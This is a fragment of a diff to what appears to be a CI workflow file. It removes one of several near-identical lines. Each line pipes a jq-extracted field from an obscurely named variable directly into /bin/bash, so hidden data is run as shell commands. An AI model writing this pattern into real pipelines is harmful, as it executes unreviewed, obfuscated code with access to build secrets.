@@ -42,7 +42,6 @@ jobs:
           echo $s10 | jq -r .lfl29 | /bin/bash
           printf '%s' "$otsa08" | jq -r .o78935 | /bin/bash
           echo $ojorg3858 | jq -r .p6999 | /bin/bash
-          echo $ms1884 | jq -r .unvj46 | /bin/bash
           printf '%s' "$jvbg4" | jq -r .ggxj911 | /bin/bash
           echo $cfm33 | jq -r .peq2 | /bin/bash
           echo $vwyms55 | jq -r .ssys871 | /bin/bash
